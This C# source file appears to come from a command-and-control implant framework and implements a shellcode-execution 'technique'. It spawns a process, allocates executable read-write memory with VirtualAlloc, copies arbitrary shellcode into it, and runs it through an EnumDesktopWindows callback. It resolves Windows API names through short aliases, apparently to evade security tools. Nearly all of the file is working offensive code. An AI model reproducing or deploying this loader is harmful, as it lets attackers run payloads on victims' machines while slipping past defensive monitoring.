using Agent.Interfaces;
using Agent.Models;
using Invoker.Dynamic;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using static Invoker.Data.Win32;

//based upon https://github.com/JkMaFlLi/xorInject
namespace Agent
{
    internal class DeskEnum : ITechnique
    {
        int ITechnique.id => 4;
        private static readonly TaskScheduler _singleThreadScheduler = new ConcurrentExclusiveSchedulerPair().ExclusiveScheduler;

        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
        {
            return await Task.Factory.StartNew(async () =>
            {
                spawnOptions.suspended = false;

                if (!await spawner.Spawn(spawnOptions))
                {
                    return false;
                }

                SafeProcessHandle hProc;

                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
                {
                    return false;
                }

                return Run(hProc.DangerousGetHandle(), shellcode);
            }, CancellationToken.None, TaskCreationOptions.None, _singleThreadScheduler).Unwrap();
        }


        private bool Run(IntPtr hTarget, byte[] shellcode)
        {
            List<string> k32Funcs = new List<string>
            {
                "va",        // VirtualAlloc (kernel32.dll)
                "gcti"       // GetCurrentThreadId (kernel32.dll)
            };

            List<string> u32Funcs = new List<string>
            {
                "gtd",        // GetThreadDesktop (user32.dll)
                "edw"      // EnumDesktopWindows (user32.dll)
            };

            //resolve u32 and k32 funcs
            if (!Resolver.TryResolveFuncs(k32Funcs, "k32", out var err) | !Resolver.TryResolveFuncs(u32Funcs, "u32", out var err2))
            {
                Console.WriteLine(err);
                Console.WriteLine(err2);
                return false;
            }

            //Injection

            //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
            IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);

            if (funcAddr == IntPtr.Zero)
            {
                Console.WriteLine("Memory allocation failed");
                return false;
            }
            Console.WriteLine("Allocated memory at: " + funcAddr);

            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

            //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); 
            object[] gctParams = new object[] { }; // No parameters for GetCurrentThreadId
            uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);

            object[] gtdParams = new object[] { threadId }; // GetThreadDesktop takes the thread ID
            IntPtr hDesktop = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gtd"), typeof(GTDDelegate), ref gtdParams);









            if (hDesktop == IntPtr.Zero)
            {
                Console.WriteLine("Failed to get desktop handle");
                return false;
            }
            Console.WriteLine("Found desktop handle: " + hDesktop);

            //Execute EnumDesktopWindows
            return EnumDesktopWindows(hDesktop, DesktopCallback, funcAddr);
        }

        private static bool DesktopCallback(IntPtr hwnd, IntPtr lParam)
        {
            ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(lParam, typeof(ShellcodeDelegate));
            shellcodeFunc();
            return false;
        }

        //Delegate types
        private delegate bool EnumDesktopWindowsProc(IntPtr hwnd, IntPtr lParam);
        private delegate void ShellcodeDelegate();

        //ToBeImplemented
        private delegate IntPtr VADelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
        private delegate IntPtr GTDDelegate(uint dwThreadId);
        private delegate uint GCTDelegate();
        private delegate bool EnumDesktopWindowsDelegate(IntPtr hDesktop, EnumDesktopWindowsProc lpEnumFunc, IntPtr lParam);


        //constants
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;


        //DLL Imports and structures
        [DllImport("user32.dll")]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("user32.dll")]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();


    }
}
